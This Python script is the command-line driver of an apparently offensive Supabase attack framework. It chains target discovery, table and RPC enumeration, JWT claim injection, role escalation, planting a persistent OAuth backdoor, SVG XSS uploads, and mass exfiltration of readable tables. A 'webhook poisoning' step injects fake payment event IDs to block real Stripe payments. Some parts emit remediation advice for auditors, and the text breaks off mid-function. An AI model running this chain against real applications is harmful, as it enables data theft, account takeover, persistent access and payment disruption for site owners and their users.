#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ███████╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██╗   ██╗███╗   ██╗  ║
║   ██╔════╝██║   ██║██╔══██╗██╔══██╗██║  ██║██║   ██║████╗  ██║  ║
║   ███████╗██║   ██║██████╔╝███████║███████║██║   ██║██╔██╗ ██║  ║
║   ╚════██║██║   ██║██╔═══╝ ██╔══██║██╔══██║██║   ██║██║╚██╗██║  ║
║   ███████║╚██████╔╝██║     ██║  ██║██║  ██║╚██████╔╝██║ ╚████║  ║
║   ╚══════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝  ║
║                                                                   ║
║   Supabase Security Auditing & Penetration Testing Framework      ║
║   v3.0 — For authorized security testing only                     ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝

Usage:
    supahunt.py discover <url>                 Auto-detect Supabase from any URL
    supahunt.py scan <url> [options]            Full automated scan
    supahunt.py enum <url> [options]            Enumerate tables, RPCs, storage
    supahunt.py exploit <url> [options]         Run exploitation modules
    supahunt.py exfil <url> [options]           Mass data exfiltration
    supahunt.py webhook <url> [options]         Webhook idempotency poisoning
    supahunt.py reviews <url> [options]         Mass XSS review/comment injection
    supahunt.py rpc-abuse <url> [options]       Probe & exploit exposed RPCs
    supahunt.py forge <url> [options]           Token forgery (JWT, HMAC, ad tokens)
    supahunt.py full <url> [options]            Full kill chain v3 (12 phases)

Options:
    --supabase-url URL       Supabase URL (skip auto-discovery)
    --anon-key KEY           Supabase anon key (skip auto-discovery)
    --token TOKEN            Auth token (skip account creation)
    --email EMAIL            Email for account creation
    --password PASS          Password for account creation
    --proxy PROXY            HTTP proxy (e.g., http://127.0.0.1:8080)
    --output DIR             Output directory (default: ./output)
    --threads N              Thread count (default: 10)
    --timeout N              Request timeout in seconds (default: 15)
    --no-exploit             Skip exploitation (recon only)
    --no-exfil               Skip data exfiltration
    --tables TABLE,...       Additional table names to probe
    --quiet                  Minimal output
    --json                   JSON output only
"""

import argparse
import json
import os
import sys
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.text import Text
from rich import box

# Local modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from modules.discovery import Discovery, SupabaseTarget, decode_jwt_payload
from modules.discovery_v2 import DiscoveryV2
from modules.enumerator import Enumerator
from modules.exploiter import AuthExploiter, DataExploiter, RPCExploiter, PersistenceExploiter, ProfileExploiter
from modules.graphql_tester import GraphQLMutationTester
from modules.storage_exploiter import StorageExploiter
from modules.filter_injection import FilterInjectionTester
from modules.reporter import ScanReport, Finding
from modules.webhook_poisoner import WebhookPoisoner
from modules.review_injector import ReviewInjector
from modules.rpc_abuser import RPCAbuser
from modules.token_forger import TokenForger

console = Console()

BANNER = """[bold red]
 ███████╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗
 ██╔════╝██║   ██║██╔══██╗██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝
 ███████╗██║   ██║██████╔╝███████║███████║██║   ██║██╔██╗ ██║   ██║
 ╚════██║██║   ██║██╔═══╝ ██╔══██║██╔══██║██║   ██║██║╚██╗██║   ██║
 ███████║╚██████╔╝██║     ██║  ██║██║  ██║╚██████╔╝██║ ╚████║   ██║
 ╚══════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝[/]
[dim]Supabase Security Auditing & Penetration Testing Framework v3.0[/]
[dim]For authorized security testing only[/]
"""


def print_banner():
    console.print(BANNER)


def print_target_info(target: SupabaseTarget):
    """Display discovered target information."""
    table = Table(title="Target Information", box=box.ROUNDED, show_lines=True)
    table.add_column("Property", style="cyan", width=20)
    table.add_column("Value", style="white")

    table.add_row("App URL", target.app_url or "N/A")
    table.add_row("Supabase URL", target.supabase_url or "[red]NOT FOUND[/]")
    table.add_row("Project Ref", target.project_ref or "N/A")

    if target.anon_key:
        payload = decode_jwt_payload(target.anon_key)
        role = payload.get("role", "?")
        table.add_row("Anon Key", f"{target.anon_key[:30]}... [green](role: {role})[/]")
    else:
        table.add_row("Anon Key", "[red]NOT FOUND[/]")

    if target.service_role_key:
        table.add_row("Service Role Key", "[bold red on white] FOUND — CRITICAL [/]")
    else:
        table.add_row("Service Role Key", "[dim]not found[/]")

    # Auth settings
    auth = target.auth_settings
    if auth:
        signup = not auth.get("disable_signup", True)
        autoconfirm = auth.get("mailer_autoconfirm", False)
        table.add_row(
            "Signup",
            f"{'[green]ENABLED[/]' if signup else '[red]DISABLED[/]'}"
            f" {'[bold yellow](AUTO-CONFIRM)[/]' if autoconfirm else ''}",
        )
        ext = auth.get("external", {})
        providers = [k for k, v in ext.items() if v and isinstance(v, bool)]
        if providers:
            table.add_row("OAuth Providers", ", ".join(providers))

    # Headers of interest
    for h in ["server", "x-powered-by", "x-frame-options", "content-security-policy"]:
        val = target.headers_info.get(h, target.headers_info.get(h.title(), ""))
        if val:
            table.add_row(f"Header: {h}", val[:100])

    console.print(table)


def print_tables(tables: list):
    """Display discovered tables."""
    table = Table(title=f"Discovered Tables ({len(tables)})", box=box.ROUNDED)
    table.add_column("#", style="dim", width=4)
    table.add_column("Table", style="cyan", width=35)
    table.add_column("Records", justify="right", width=10)
    table.add_column("SELECT", justify="center", width=8)
    table.add_column("INSERT", justify="center", width=8)
    table.add_column("UPDATE", justify="center", width=8)
    table.add_column("DELETE", justify="center", width=8)

    for i, t in enumerate(tables, 1):
        count = t.record_count if t.record_count is not None else "?"
        count_style = "bold red" if isinstance(count, int) and count > 100 else ""
        table.add_row(
            str(i),
            t.name,
            Text(f"{count:,}" if isinstance(count, int) else str(count), style=count_style),
            "[green]Y[/]" if t.select_allowed else "[red]N[/]",
            "[bold red]Y[/]" if t.insert_allowed else "[green]N[/]",
            "[bold red]Y[/]" if t.update_allowed else "[green]N[/]",
            "[bold red]Y[/]" if t.delete_allowed else "[green]N[/]",
        )

    console.print(table)


def print_rpcs(rpcs: list):
    """Display discovered RPC functions."""
    table = Table(title=f"RPC Functions ({len(rpcs)})", box=box.ROUNDED)
    table.add_column("Function", style="cyan", width=40)
    table.add_column("Callable", justify="center", width=10)
    table.add_column("Impact", width=40)
    table.add_column("Response", width=30)

    for r in rpcs:
        callable_str = "[bold red]YES[/]" if r.get("callable") else "[green]no[/]"
        table.add_row(
            r.get("name", "?"),
            callable_str,
            r.get("impact", ""),
            r.get("response", "")[:30],
        )

    console.print(table)


def print_finding(f: Finding):
    """Display a single finding."""
    sev_colors = {
        "CRITICAL": "bold white on red",
        "HIGH": "bold red",
        "MEDIUM": "bold yellow",
        "LOW": "cyan",
        "INFO": "dim",
    }
    style = sev_colors.get(f.severity, "white")
    console.print(f"  [{style}][{f.severity}][/] {f.id}: {f.title}")


# ══════════════════════════════════════════════
# COMMAND HANDLERS
# ══════════════════════════════════════════════


def cmd_discover(args):
    """Discover Supabase instance from target URL."""
    print_banner()
    disc = Discovery(console=console, timeout=args.timeout, proxy=args.proxy)

    if args.supabase_url and args.anon_key:
        target = disc.discover_from_config(args.supabase_url, args.anon_key)
        if args.url:
            target.app_url = args.url
    else:
        target = disc.discover(args.url)

    print_target_info(target)

    if target.supabase_url and target.anon_key:
        console.print("\n[bold green][+] Supabase instance discovered successfully![/]")
    else:
        console.print("\n[bold red][!] Could not fully discover Supabase instance.[/]")
        console.print("[dim]Try providing --supabase-url and --anon-key manually.[/]")

    return target


def cmd_enum(args, target: SupabaseTarget = None):
    """Enumerate tables, RPCs, storage, GraphQL."""
    if not target:
        target = cmd_discover(args)

    if not target.supabase_url or not target.anon_key:
        console.print("[bold red][!] Cannot enumerate without Supabase URL and anon key.[/]")
        return None, None, None, None

    report = ScanReport(args.url, target.to_dict())
    enum = Enumerator(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
        threads=args.threads,
    )

    # 1. Tables
    console.print("\n[bold cyan]═══ TABLE ENUMERATION ═══[/]\n")
    custom = args.tables.split(",") if args.tables else []
    tables = enum.enumerate_tables(custom_tables=custom, token=args.token)

    if tables:
        # RLS testing
        console.print(f"\n[*] Testing RLS on {len(tables)} tables...", style="cyan")
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console,
        ) as progress:
            task = progress.add_task("RLS testing", total=len(tables))
            for t in tables:
                enum.test_rls(t, token=args.token)
                progress.advance(task)

        print_tables(tables)
        report.tables_found = [t.to_dict() for t in tables]

        # Generate findings
        for t in tables:
            if t.select_allowed and (t.record_count or 0) > 0:
                report.add_finding(
                    title=f"Table '{t.name}' readable ({t.record_count} records)",
                    severity="HIGH" if t.record_count and t.record_count > 100 else "MEDIUM",
                    category="RLS",
                    description=f"Table {t.name} is readable with "
                                f"{'anon' if not args.token else 'auth'} key. "
                                f"{t.record_count} records accessible.",
                    evidence=f"Columns: {', '.join(t.columns[:10])}",
                    remediation="Add restrictive RLS SELECT policy.",
                )
            if t.insert_allowed:
                report.add_finding(
                    title=f"Table '{t.name}' allows INSERT",
                    severity="CRITICAL",
                    category="RLS",
                    description=f"INSERT into {t.name} is not blocked by RLS.",
                    remediation="Add RLS INSERT policy restricting to authorized roles.",
                )
            if t.update_allowed:
                report.add_finding(
                    title=f"Table '{t.name}' allows UPDATE",
                    severity="HIGH",
                    category="RLS",
                    description=f"UPDATE on {t.name} is not blocked by RLS.",
                    remediation="Add RLS UPDATE policy.",
                )
            if t.delete_allowed:
                report.add_finding(
                    title=f"Table '{t.name}' allows DELETE",
                    severity="CRITICAL",
                    category="RLS",
                    description=f"DELETE from {t.name} is not blocked by RLS.",
                    remediation="Add RLS DELETE policy.",
                )

    # 2. RPCs
    console.print("\n[bold cyan]═══ RPC ENUMERATION ═══[/]\n")
    rpcs = enum.enumerate_rpcs(token=args.token)
    if rpcs:
        print_rpcs(rpcs)
        report.rpcs_found = rpcs

        for r in rpcs:
            if r.get("callable"):
                report.add_finding(
                    title=f"RPC '{r['name']}' callable without admin auth",
                    severity="CRITICAL" if "cleanup" in r["name"] or "expire" in r["name"]
                            or "delete" in r["name"] or "credit" in r["name"]
                            else "HIGH",
                    category="RPC",
                    description=f"Function {r['name']} can be called by "
                                f"{'anon' if not args.token else 'non-admin auth'} user.",
                    impact=r.get("impact", ""),
                    remediation="Add SECURITY INVOKER or explicit auth check in function body.",
                )

    # 3. Storage
    console.print("\n[bold cyan]═══ STORAGE ENUMERATION ═══[/]\n")
    buckets = enum.enumerate_storage(token=args.token)
    if buckets:
        for b in buckets:
            console.print(
                f"  [{'green' if b.public else 'yellow'}]"
                f"{'PUBLIC' if b.public else 'private'}[/] "
                f"{b.name} — {b.file_count} files"
            )
        report.buckets_found = [b.to_dict() for b in buckets]
    else:
        console.print("  [dim]No accessible buckets found.[/]")

    # 4. GraphQL
    console.print("\n[bold cyan]═══ GRAPHQL INTROSPECTION ═══[/]\n")
    gql = enum.graphql_introspect(token=args.token)
    if gql and "data" in gql:
        types = gql["data"]["__schema"]["types"]
        queries = gql["data"]["__schema"]["queryType"]["fields"]
        mutations = gql["data"]["__schema"]["mutationType"]["fields"] if gql["data"]["__schema"].get("mutationType") else []
        console.print(f"  [green][+][/] {len(types)} types, {len(queries)} queries, {len(mutations)} mutations")

        if mutations:
            inserts = [m["name"] for m in mutations if m["name"].startswith("insertInto")]
            updates = [m["name"] for m in mutations if m["name"].startswith("update") and not m["name"].startswith("updateFrom")]
            deletes = [m["name"] for m in mutations if m["name"].startswith("deleteFrom")]
            console.print(f"  Mutations: {len(inserts)} INSERT, {len(updates)} UPDATE, {len(deletes)} DELETE")

            if inserts or updates or deletes:
                report.add_finding(
                    title=f"GraphQL exposes {len(mutations)} mutations",
                    severity="CRITICAL",
                    category="GraphQL",
                    description=f"GraphQL schema exposes {len(inserts)} INSERT, "
                                f"{len(updates)} UPDATE, {len(deletes)} DELETE mutations.",
                    evidence=f"Sample: {', '.join(inserts[:5])}",
                    remediation="Disable GraphQL introspection in production and add RLS.",
                )

        report.add_finding(
            title=f"GraphQL introspection enabled ({len(types)} types)",
            severity="HIGH",
            category="GraphQL",
            description="Full schema introspection is enabled, exposing all table "
                        "names, columns, relationships, and mutation signatures.",
            remediation="Set `introspection: false` in GraphQL config.",
        )
    else:
        console.print("  [dim]GraphQL introspection not available or blocked.[/]")

    # Auth settings findings
    auth = target.auth_settings
    if auth:
        if not auth.get("disable_signup", True):
            report.add_finding(
                title="Signup enabled",
                severity="INFO",
                category="Auth",
                description="Public signup is enabled.",
            )
        if auth.get("mailer_autoconfirm", False):
            report.add_finding(
                title="Auto-confirm enabled (no email verification)",
                severity="HIGH",
                category="Auth",
                description="Accounts are auto-confirmed on signup. No email verification required. "
                            "Enables mass sockpuppet creation.",
                remediation="Set mailer_autoconfirm to false in Supabase auth settings.",
            )

    return target, tables, rpcs, report


def cmd_exploit(args, target: SupabaseTarget = None, report: ScanReport = None):
    """Run exploitation modules."""
    if not target:
        target = cmd_discover(args)

    if not report:
        report = ScanReport(args.url, target.to_dict())

    auth_exp = AuthExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)
    token = args.token
    user_id = None

    console.print("\n[bold cyan]═══ AUTH EXPLOITATION ═══[/]\n")

    # 1. Check signup
    signup_info = auth_exp.check_signup_enabled()
    console.print(f"  Signup: {'ENABLED' if signup_info['signup_enabled'] else 'disabled'}")
    console.print(f"  Auto-confirm: {'YES' if signup_info['autoconfirm'] else 'no'}")

    # 2. Create account if no token
    if not token and signup_info["signup_enabled"]:
        result = auth_exp.create_account(email=args.email, password=args.password or "AuditTest2026")
        if result["success"]:
            token = result["access_token"]
            user_id = result["user_id"]

            if result["auto_confirmed"]:
                report.add_finding(
                    title="Account auto-confirmed on signup",
                    severity="HIGH",
                    category="Auth",
                    description=f"Created account {result['email']} — auto-confirmed, "
                                f"immediate access token received.",
                    evidence=f"user_id: {user_id}",
                )

            # 3. JWT claim injection
            console.print("\n[bold cyan]═══ JWT CLAIM INJECTION ═══[/]\n")
            inject = auth_exp.inject_jwt_claims(token)
            if inject["success"] and inject.get("injected"):
                report.add_finding(
                    title="JWT admin claim injection via user_metadata",
                    severity="CRITICAL",
                    category="Auth",
                    description="Arbitrary claims can be injected into user_metadata "
                                "via PUT /auth/v1/user. These claims appear in the JWT "
                                "after refresh.",
                    evidence=f"Injected: {json.dumps(inject.get('user_metadata', {}))}",
                    impact="If any server-side code checks user_metadata.role instead "
                           "of a database role column, this grants full admin access.",
                    remediation="Restrict user_metadata writes or never trust user_metadata "
                                "for authorization decisions.",
                    cvss=9.8,
                )

                # Refresh to bake claims into JWT
                refresh = result.get("refresh_token", "")
                if refresh:
                    new_tokens = auth_exp.refresh_token(refresh)
                    if new_tokens["success"]:
                        token = new_tokens["access_token"]
                        console.print("  [+] Token refreshed with injected claims.", style="green")

    if not token:
        console.print("[yellow][!] No auth token available. Exploitation limited.[/]")
        return target, report, token

    # 4. Profile exploitation
    if user_id:
        console.print("\n[bold cyan]═══ PROFILE EXPLOITATION ═══[/]\n")
        prof_exp = ProfileExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)

        roles = prof_exp.test_role_escalation(user_id, token)
        for role, status in roles.items():
            if status == "ESCALATED":
                report.add_finding(
                    title=f"Role escalation to '{role}' via profile UPDATE",
                    severity="CRITICAL",
                    category="Privilege Escalation",
                    description=f"profiles.role can be changed to '{role}' via REST PATCH.",
                    cvss=9.8,
                )
                console.print(f"  [bold red][!!!] Role escalation to {role} SUCCEEDED![/]")
            else:
                console.print(f"  [green]Role '{role}': blocked[/]")

        fields = prof_exp.test_sensitive_fields(user_id, token)
        for name, result in fields.items():
            if result["writable"]:
                report.add_finding(
                    title=f"Sensitive profile field writable: {name}",
                    severity="HIGH",
                    category="Privilege Escalation",
                    description=f"Profile field test '{name}' succeeded — field is writable "
                                f"without additional authorization.",
                )
                console.print(f"  [bold yellow][+] {name}: WRITABLE[/]")
            else:
                console.print(f"  [green]{name}: blocked[/]")

    # 5. RPC exploitation
    console.print("\n[bold cyan]═══ RPC EXPLOITATION ═══[/]\n")
    rpc_exp = RPCExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)
    dangerous = rpc_exp.test_dangerous_rpcs(token)
    for r in dangerous:
        status = "[bold red]CALLABLE[/]" if r["callable"] else "[green]blocked[/]"
        console.print(f"  {status} {r['name']} — {r['impact']}")
        if r["callable"]:
            report.add_finding(
                title=f"Dangerous RPC callable: {r['name']}",
                severity="CRITICAL",
                category="RPC",
                description=f"Admin function {r['name']} is callable by authenticated user. "
                            f"Impact: {r['impact']}",
                evidence=f"Response: {r['response'][:200]}",
                remediation="Add admin role check inside the function body.",
                cvss=8.5,
            )

    # 6. Persistence
    if user_id:
        console.print("\n[bold cyan]═══ PERSISTENCE TEST ═══[/]\n")
        pers = PersistenceExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)
        backdoor = pers.plant_oauth_backdoor(user_id, token)
        if backdoor.get("success"):
            console.print(
                f"  [bold red][+] OAuth backdoor planted! "
                f"ID={backdoor.get('id')}, expires 2099[/]"
            )
            report.add_finding(
                title="OAuth backdoor injection (oauth_states INSERT)",
                severity="CRITICAL",
                category="Persistence",
                description="Authenticated users can insert oauth_states records with "
                            "far-future expiry dates, creating persistent backdoor access "
                            "that survives password resets.",
                evidence=f"ID: {backdoor.get('id')}, token: {backdoor.get('state_token')}",
                cvss=8.2,
            )
        else:
            console.print(f"  [green]OAuth backdoor blocked: {backdoor.get('error', 'RLS')[: 100]}[/]")

    return target, report, token


def cmd_graphql_test(args, target: SupabaseTarget = None, report: ScanReport = None,
                     token: str = None):
    """Test all GraphQL mutations for RLS bypass."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())
    token = token or args.token

    console.print("\n[bold cyan]═══ GRAPHQL MUTATION RLS TESTING ═══[/]\n")

    tester = GraphQLMutationTester(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
        threads=args.threads,
    )

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        console=console,
    ) as progress:
        task = progress.add_task("Testing mutations", total=1)

        def on_progress(done, total, result):
            progress.update(task, total=total, completed=done,
                            description=f"Testing: {result.table}")

        results = tester.test_all_mutations(
            token=token,
            progress_callback=on_progress,
        )

    summary = results["summary"]

    # Print summary table
    table = Table(title="GraphQL Mutation RLS Audit", box=box.ROUNDED)
    table.add_column("Metric", style="cyan")
    table.add_column("Value", justify="right")
    table.add_row("Total tested", str(summary["total_tested"]))
    table.add_row("[bold red]RLS bypass[/]", str(summary["rls_bypass"]))
    table.add_row("[yellow]Constraint-only block[/]", str(summary["constraint_block"]))
    table.add_row("[green]RLS blocked[/]", str(summary["rls_block"]))
    table.add_row("Errors/Skipped", str(summary["errors"] + summary["skipped"]))
    table.add_row("[bold]RLS coverage[/]", f"{summary['rls_coverage_pct']}%")
    table.add_row("[bold red]Bypass rate[/]", f"{summary['bypass_pct']}%")
    console.print(table)

    if summary["bypass_tables"]:
        console.print(f"\n[bold red]INSERT bypass tables:[/] {', '.join(summary['bypass_tables'])}")

    # Generate findings
    for r in results["insert"]:
        if r.is_bypass:
            report.add_finding(
                title=f"GraphQL INSERT bypass: {r.table}",
                severity="CRITICAL",
                category="GraphQL RLS",
                description=f"INSERT into {r.table} succeeded via GraphQL without authorization. "
                            f"{r.affected_count} row(s) created.",
                remediation="Add RLS INSERT policy on this table.",
                cvss=9.1,
            )
        elif r.is_constraint_only:
            report.add_finding(
                title=f"GraphQL INSERT constraint-only block: {r.table}",
                severity="HIGH",
                category="GraphQL RLS",
                description=f"INSERT into {r.table} passed RLS but was blocked by "
                            f"database constraint: {r.error_message[:100]}. "
                            f"With valid reference values, this INSERT would succeed.",
                remediation="Add RLS INSERT policy — constraint is not a security control.",
            )

    for op in ("update", "delete"):
        for r in results[op]:
            if r.is_bypass:
                report.add_finding(
                    title=f"GraphQL {r.operation} accessible: {r.table}",
                    severity="HIGH",
                    category="GraphQL RLS",
                    description=f"{r.operation} mutation on {r.table} is accepted "
                                f"without RLS blocking.",
                    remediation=f"Add RLS {r.operation} policy on this table.",
                )

    report.add_finding(
        title=f"GraphQL RLS coverage: {summary['rls_coverage_pct']}% "
              f"({summary['rls_block']}/{summary['total_tested']})",
        severity="CRITICAL" if summary["bypass_pct"] > 50 else
                 "HIGH" if summary["bypass_pct"] > 20 else "MEDIUM",
        category="GraphQL RLS",
        description=f"{summary['bypass_pct']}% of mutations bypass RLS. "
                    f"{summary['insert_bypass_count']} INSERT, "
                    f"{summary['update_bypass_count']} UPDATE, "
                    f"{summary['delete_bypass_count']} DELETE bypasses.",
    )

    # Cleanup test rows
    if not args.no_cleanup:
        tester.cleanup_created_rows(results, token)

    return target, report, token, results


def cmd_storage_audit(args, target: SupabaseTarget = None,
                      report: ScanReport = None, token: str = None):
    """Audit all storage buckets for misconfigurations."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())
    token = token or args.token

    console.print("\n[bold cyan]═══ STORAGE SECURITY AUDIT ═══[/]\n")

    storage = StorageExploiter(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
    )

    buckets = storage.audit_all_buckets(token=token)

    # Print results
    table = Table(title=f"Storage Buckets ({len(buckets)})", box=box.ROUNDED)
    table.add_column("Bucket", style="cyan", width=20)
    table.add_column("Public", justify="center", width=8)
    table.add_column("Files", justify="right", width=8)
    table.add_column("Upload", justify="center", width=8)
    table.add_column("MIME Bypass", justify="center", width=12)
    table.add_column("SVG XSS", justify="center", width=10)

    for b in buckets:
        mime_bypasses = sum(1 for v in b.mime_bypass_results.values()
                           if v.get("bypass"))
        xss_uploaded = any(v.get("uploaded") for v in b.xss_results.values())

        table.add_row(
            b.name,
            "[green]YES[/]" if b.public else "[dim]no[/]",
            str(b.file_count),
            "[bold red]YES[/]" if b.upload_allowed else "[green]no[/]",
            f"[bold red]{mime_bypasses}[/]" if mime_bypasses else "[green]0[/]",
            "[bold red]YES[/]" if xss_uploaded else "[green]no[/]",
        )

    console.print(table)

    # Generate findings
    for b in buckets:
        if b.upload_allowed:
            report.add_finding(
                title=f"Storage bucket '{b.name}' allows upload",
                severity="HIGH",
                category="Storage",
                description=f"Bucket {b.name} accepts file uploads.",
            )

        mime_bypasses = {k: v for k, v in b.mime_bypass_results.items()
                        if v.get("bypass")}
        if mime_bypasses:
            report.add_finding(
                title=f"MIME type bypass on bucket '{b.name}'",
                severity="HIGH",
                category="Storage",
                description=f"MIME validation can be bypassed: "
                            f"{', '.join(mime_bypasses.keys())}",
                evidence=json.dumps(mime_bypasses, indent=2),
                remediation="Validate file content (magic bytes), not just Content-Type header.",
            )

        xss_results = {k: v for k, v in b.xss_results.items()
                       if v.get("uploaded")}
        if xss_results:
            executable = any(v.get("xss_executable") for v in xss_results.values())
            report.add_finding(
                title=f"SVG XSS upload on bucket '{b.name}'",
                severity="CRITICAL" if executable else "HIGH",
                category="Storage XSS",
                description=f"SVG file with JavaScript uploaded successfully. "
                            f"{'XSS is EXECUTABLE (no CSP)!' if executable else 'CSP may mitigate.'}",
                remediation="Block SVG uploads or add Content-Security-Policy header.",
                cvss=8.1 if executable else 5.4,
            )

    # Cleanup
    if not args.no_cleanup:
        storage.cleanup(token)

    return target, report, token


def cmd_filter_test(args, target: SupabaseTarget = None,
                    tables: list = None, report: ScanReport = None,
                    token: str = None):
    """Test PostgREST filter injection on all tables."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())
    token = token or args.token

    console.print("\n[bold cyan]═══ POSTGREST FILTER INJECTION ═══[/]\n")

    tester = FilterInjectionTester(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
    )

    # If no tables provided, enumerate first
    if not tables:
        enum = Enumerator(target, console=console, timeout=args.timeout,
                          proxy=args.proxy, threads=args.threads)
        tables = enum.enumerate_tables(token=token)

    # Filter to readable tables with data
    testable = [t for t in tables if t.select_allowed and (t.record_count or 0) > 0]
    console.print(f"  Testing {len(testable)} tables with data...")

    results = tester.test_all_tables(testable, token)

    # Also test app-level API routes
    if args.url:
        console.print("\n[bold cyan]═══ API ROUTE INJECTION ═══[/]\n")
        api_results = tester.test_api_route_injection(args.url)
        results.extend(api_results)

    # Generate findings
    for r in results:
        if r.vulnerable:
            report.add_finding(
                title=f"Filter injection: {r.table}.{r.param} via {r.vector}",
                severity=r.severity,
                category="Filter Injection",
                description=f"PostgREST filter injection on {r.table} via "
                            f"parameter '{r.param}'. {r.evidence}",
                remediation="Sanitize user input before passing to PostgREST filters. "
                            "Use parameterized queries in Edge Functions.",
                cvss=7.5 if r.severity == "HIGH" else 5.3,
            )

    return target, report, token


def cmd_discover_v2(args):
    """Enhanced discovery with source maps, API probing, secrets."""
    print_banner()
    disc = DiscoveryV2(console=console, timeout=args.timeout, proxy=args.proxy)

    if args.supabase_url and args.anon_key:
        # Skip full discovery, just build target
        target_result = disc.discover(args.url, deep=True)
    else:
        target_result = disc.discover(args.url, deep=True)

    target = target_result["target"]

    if args.supabase_url:
        target.supabase_url = args.supabase_url
        target.project_ref = args.supabase_url.split("//")[1].split(".")[0]
        target.rest_url = f"{target.supabase_url}/rest/v1"
        target.graphql_url = f"{target.supabase_url}/graphql/v1"
        target.auth_url = f"{target.supabase_url}/auth/v1"
        target.storage_url = f"{target.supabase_url}/storage/v1"
    if args.anon_key:
        target.anon_key = args.anon_key

    print_target_info(target)

    # Print extra findings
    if target_result["secrets_found"]:
        console.print(f"\n[bold red][!] {len(target_result['secrets_found'])} secrets found in JS bundles[/]")
        for stype, sval in target_result["secrets_found"]:
            console.print(f"  [red]{stype}[/]: {sval}")

    if target_result["source_maps"]:
        console.print(f"\n[bold red][!] {len(target_result['source_maps'])} source maps exposed[/]")

    if target_result["extra_supabase_projects"]:
        console.print(f"\n[bold yellow][!] {len(target_result['extra_supabase_projects'])} extra Supabase projects[/]")
        for p in target_result["extra_supabase_projects"]:
            console.print(f"  {p['ref']}: {p['url']}")

    if target_result["api_routes"]:
        accessible = [r for r in target_result["api_routes"] if r.get("status") == 200]
        console.print(f"\n[bold cyan][*] {len(accessible)} accessible API routes found[/]")

    return target, target_result


def cmd_exfil(args, target: SupabaseTarget = None, tables: list = None,
              token: str = None, report: ScanReport = None):
    """Mass data exfiltration."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())

    token = token or args.token
    data_exp = DataExploiter(target, console=console, timeout=args.timeout, proxy=args.proxy)

    console.print("\n[bold cyan]═══ DATA EXFILTRATION ═══[/]\n")

    # If no tables provided, enumerate first
    if not tables:
        enum = Enumerator(target, console=console, timeout=args.timeout, proxy=args.proxy,
                          threads=args.threads)
        tables = enum.enumerate_tables(token=token)

    output_dir = os.path.join(args.output, "exfil")
    os.makedirs(output_dir, exist_ok=True)

    total_records = 0
    total_size = 0

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        console=console,
    ) as progress:
        readable_tables = [t for t in tables if t.select_allowed and (t.record_count or 0) > 0]
        task = progress.add_task("Exfiltrating", total=len(readable_tables))

        for t in readable_tables:
            progress.update(task, description=f"Exfil: {t.name}")
            data = data_exp.exfiltrate_table(t.name, token=token)

            if data:
                path = os.path.join(output_dir, f"{t.name}.json")
                raw = json.dumps(data, indent=2, default=str)
                with open(path, "w") as f:
                    f.write(raw)
                total_records += len(data)
                total_size += len(raw)
                console.print(
                    f"  [green][+][/] {t.name}: {len(data)} records ({len(raw)} bytes)"
                )

            progress.advance(task)

    console.print(
        f"\n[bold green][+] Exfiltration complete: "
        f"{total_records:,} records, {total_size:,} bytes[/]"
    )
    console.print(f"  Saved to: {output_dir}")

    report.exfil_stats = {
        "total_records": total_records,
        "total_bytes": total_size,
        "output_dir": output_dir,
    }

    return report


def cmd_webhook(args, target: SupabaseTarget = None, report: ScanReport = None,
                 token: str = None):
    """Webhook idempotency poisoning — block real Stripe payments."""
    if not target:
        target = cmd_discover(args)
    if not report:
        report = ScanReport(args.url, target.to_dict())
    token = token or args.token

    console.print("\n[bold cyan]═══ WEBHOOK IDEMPOTENCY POISONING ═══[/]\n")

    poisoner = WebhookPoisoner(
        target, console=console, timeout=args.timeout, proxy=args.proxy,
    )

    # 1. Find webhook table
    table = poisoner.find_webhook_table(token)
    if not table:
        console.print("[yellow]No webhook table found — skipping[/]")
        return target, report, token

    # 2. Get schema
    schema = poisoner.get_table_schema(token)
    if schema:
        console.print(f"  Schema: {[f['name'] for f in schema]}")

    # 3. Poison via GraphQL
    events_per_type = getattr(args, "events_per_type", 100)
    results = poisoner.poison_via_graphql(
        events_per_type=events_per_type, token=token,
    )

    if results.get("total", 0) == 0:
        # Fallback to REST
        console.print("  [yellow]GraphQL failed, trying REST...[/]")
        results = poisoner.poison_via_rest(
            events_per_type=events_per_type, token=token,
        )

    # 4. Verify
    verify = poisoner.verify_poisoning(token)

    provider = results.get("provider", "unknown")
    if results.get("total", 0) > 0:
        report.add_finding(
            title=f"Webhook idempotency poisoning: {results['total']} fake events injected",
            severity="CRITICAL",
            category="Payment Security",
            description=f"Injected {results['total']} fake {provider} event IDs into "
                        f"'{table}'. Real payment webhooks matching these IDs will "
                        f"be silently dropped, blocking subscription activations, "
                        f"invoice processing, and refunds.",
            evidence=json.dumps(results, indent=2),
